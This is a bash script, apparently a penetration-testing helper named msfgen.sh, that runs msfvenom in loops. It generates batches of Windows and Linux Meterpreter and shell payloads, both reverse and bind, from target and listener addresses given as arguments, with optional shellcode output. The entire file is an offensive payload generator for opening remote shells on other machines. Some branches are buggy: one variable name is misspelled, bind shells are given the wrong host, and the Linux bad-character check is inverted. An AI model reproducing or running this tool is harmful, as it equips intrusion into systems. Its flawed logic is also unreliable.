#!/bin/bash

# Generate a bunch of msvenom exploits to try.

# colours first
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# arrays of shell types
WrevshellTypes=("meterpreter_reverse_tcp" "x64/meterpreter_reverse_tcp" \
"meterpreter/reverse_tcp" "x64/meterpreter/reverse_tcp" \
"shell_reverse_tcp" "x64/shell_reverse_tcp" "shell/reverse_tcp" "x64/shell/reverse_tcp")

WbindshellTypes=("meterpreter_bind_tcp" "x64/meterpreter_bind_tcp" "meterpreter/bind_tcp" \
"x64/meterpreter/bind_tcp" "shell_bind_tcp" "x64/shell_bind_tcp")

LrevshellTypes=("x86/meterpreter_reverse_tcp" "x64/meterpreter_reverse_tcp" \
"x86/meterpreter/reverse_tcp" "x64/meterpreter/reverse_tcp" "x86/shell_reverse_tcp" \
"x64/shell_reverse_tcp" "x86/shell/reverse_tcp" "x64/shell/reverse_tcp")

LbindshellTypes=("x64/meterpreter/bind_tcp" "x86/meterpreter/bind_tcp" \
 "x86/shell_bind_tcp" "x64/shell_bind_tcp" "x86/shell/bind_tcp" "x64/shell/bind_tcp")


# create folder if none exists
if [ ! -d "msfexploits" ];then
        mkdir msfexploits
fi


# error handling
if [ -z "$*" ]
  then
    echo "[*] Enter the rhost, lhost, lport as args!"
    echo "[*] Example: ./msfgen.sh 10.10.10.10 10.10.10.9 443"
exit 1

else


echo -e "${RED}Generating eevil exploits...${NC}"
echo ""


# get the platform to target, and ensure correct format is chosen.
read -p "Enter the platform of the target (windows/linux): " platform
echo -e "${YELLOW}In the following options just press Enter for none${NC}"
read -p "Enter badchars between speechmarks eg: \'\\x00\\x0a\'(for shellcode): " bc
badChars=$(echo $bc |sed -r 's/x/\\x/g')
read -p "Enter format (for shellcode): " formatShellcode

echo -e "${BLUE}Go make a cupper, this'll be a while...${NC}"
echo ""


case $platform in
	"windows")
	plat="exe"
	for rshell in "${WrevshellTypes[@]}";do
		shellFilename=$(echo "$rshell" |tr -d /)
		echo -e "${RED}$platform/$rshell${NC}"
		msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;

		if [[ -z "$formatShellcode" ]];then
		continue

		else


			if [[ -z "$bc" ]];then

				msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $formatShellcode EXITFUNC=thread > msfexploits/$shellFilename-$formatShellcode

			else
				msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $formatShellcode -b $badChars EXITFUNC=thread > msfexploits/$shellFilename-$formatShellcode-badchars
			fi
		fi


		done

	for bshell in "${WbindshellTypes[@]}";do
		shellFilename=$(echo "$bshell" |tr -d /)
		echo -e "${RED}$platform/$bshell${NC}"
		msfvenom -p $platfrom/$bshell rhost=$1 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;


		if [[ -z "$formatShellcode" ]];then
                continue

                else


                        if [[ -z "$bc" ]];then

				msfvenom -p $platform/$bshell rhost=$2 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode

                        else
				msfvenom -p $platform/$bshell rhost=$2 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
                        fi
                fi



	done;;


	"linux")
	plat="elf"
	for rshell in "${LrevshellTypes[@]}";do
		shellFilename=$(echo "$rshell" |tr -d /)
		echo -e "${RED}$platform/$rshell${NC}"
		msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;

		  if [[ -z "$bc" ]];then
			msfvenom -p $platform/$rshell lhost=$2 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode
                 else
                        msfvenom -p $platform/$rshell lhost=$2 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
                 fi

	done


	for bshell in "${LbindshellTypes[@]}";do
		shellFilename=$(echo "$bshell" |tr -d /)
		echo -e "${RED}$platform/$bshell${NC}"
		msfvenom -p $platform/$bshell rhost=$1 lport=$3 -f $plat > msfexploits/$shellFilename.$plat;

		  if [[ ! -z "$bc" ]];then
			msfvenom -p $platform/$bshell rhost=$1 lport=$3 -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode
                 else
			msfvenom -p $platform/$bshell rhost=$1 lport=$3 -b $badChars -f $formatShellcode > msfexploits/$shellFilename-$formatShellcode-badchars
                 fi


	done;;



esac
fi


